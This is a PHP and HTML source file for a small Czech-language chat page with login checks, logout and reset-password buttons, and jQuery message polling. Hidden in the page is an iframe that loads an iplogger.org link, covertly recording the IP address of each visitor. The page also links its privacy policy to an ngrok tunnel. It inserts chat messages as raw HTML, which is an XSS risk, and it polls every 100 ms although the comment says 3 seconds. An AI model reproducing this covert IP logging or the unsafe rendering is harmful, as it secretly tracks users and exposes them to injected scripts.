<?php
// Inicializovat sezení
session_start();

if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: Auth");
    exit;
}

?>




<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <title>Chat 2AV</title>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <link rel="shortcut icon" type="image/png" href="/img/favicon.png">

    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="logres">
<!--Button-->
 <table cellspacing="0" cellpadding="0" width="100%">
   <tr>
     <td align="right" position="fixed" style="padding: 10px;">
       <table border="0" class="mobile-button" cellspacing="0" cellpadding="0">
         <tr>
           <td align="right" position="fixed" bgcolor="#38372b" style="background-color: #38372b; margin: auto; max-width: 600px; -webkit-border-radius: 30px; -moz-border-radius: 30px; border-radius: 30px; padding: 15px 20px; " width="100%">
           <!--[if mso]>&nbsp;<![endif]-->
               <a href="Auth/reset-password.php" target="_blank" style="16px; font-family: Lucida, Geneva, Verdana, sans-serif; color: #0fff00; font-weight:normal; text-align:center; background-color: #38372b; text-decoration: none; border: none; -webkit-border-radius: 30px; -moz-border-radius: 30px; border-radius: 30px; display: inline-block;">
                   <span style="font-size: 16px; font-family: Lucida, Geneva, Verdana, sans-serif; color: #0fff00; font-weight:normal; line-height:1.5em; text-align:center;">Reset Hesla</span>
             </a>
           <!--[if mso]>&nbsp;<![endif]-->
           </td>
         </tr>
       </table>
     </td>
   </tr>
 </table>

 <!--Button-->
<center>
 <table align="center" cellspacing="0" cellpadding="0" width="100%">
   <tr>
     <td align="right" position="fixed" style="padding: 10px;">
       <table border="0" class="mobile-button" cellspacing="0" cellpadding="0">
         <tr>
           <td align="right" position="fixed" bgcolor="#dc3b3b" style="background-color: #dc3b3b; margin: auto; max-width: 600px; -webkit-border-radius: 30px; -moz-border-radius: 30px; border-radius: 30px; padding: 15px 20px; " width="100%">
           <!--[if mso]>&nbsp;<![endif]-->
               <a href="Auth/logout.php" target="_blank" style="16px; font-family: Lucida, Geneva, Verdana, sans-serif; color: #26ff00; font-weight:normal; text-align:center; background-color: #dc3b3b; text-decoration: none; border: none; -webkit-border-radius: 30px; -moz-border-radius: 30px; border-radius: 30px; display: inline-block;">
                   <span style="font-size: 16px; font-family: Lucida, Geneva, Verdana, sans-serif; color: #26ff00; font-weight:normal; line-height:1.5em; text-align:center;">Odhlásit se</span>
             </a>
           <!--[if mso]>&nbsp;<![endif]-->
           </td>
         </tr>
       </table>
     </td>
   </tr>
 </table>
</center>
</div>
    <div class="wrapper">
        <form scroll>
          
           
            <label for="message">Zpráva:</label>
            <input type="text" name="message" id="message">
            <button type="button" onclick="send()"><img src="/img/send-button.png" class=send></button>
        </form>
    </div>
  
    <div id="messages"></div> <p class></p>

    <iframe src="https://iplogger.org/1nQ9t7" frameborder="0"></iframe>

    <script type="text/javascript" id="library" src="https://cookie-policy.net/js/cookie-consent.js"></script>
<script type="text/javascript" charset="UTF-8" id="code">
	cookieconsent.run({
	  notice_banner_type: "footline",
	  consent_type: "express",
	  palette: "light",
	  language: "cs",
	  page_load_consent_levels: ["strictly-necessary"],
	  notice_banner_reject_button_hide: true,
	  preferences_center_close_button_hide: false,
	  website_name: "Chat 2AV",
	  website_privacy_policy_url: "http://4.tcp.eu.ngrok.io:12171/privacy"
	});
</script>
<noscript>Cookie Consent by
<a href="https://www.cookie-policy.net/" rel="nofollow noopener">Official Cookie Consent</a></noscript>



    <script>
        function send() {
            // Vytvořit AJAX požadavek metodou POST
            $.post("send_message.php", // URL pro požadavek
                {
                 // Objekt s hodnotami pro odeslání
                    "message" : $("#message").val()
                },
                function (data) { // Callback funkce při úspěchu
                    $("#message").val(""); // Smazat obsah pole pro zprávu
                }
            );
            reloadMessages(); // Ihned aktualizujeme právě odeslanou zprávu
        }

        function reloadMessages() {
            // Vytvořit AJAX požadavek metodou GET
            $.get("get_messages.php", function(data) {
                $("#messages").html(data); // Nastavit obsah zpráv na výstup požadavku
            });
        }

        // Prvotně načíst zprávy
        reloadMessages();

        // Vykonat funkci v určeném intervalu
        // 3000 ms = 3 sekundy
        setInterval(reloadMessages, 100);
    </script>
</body>
</html>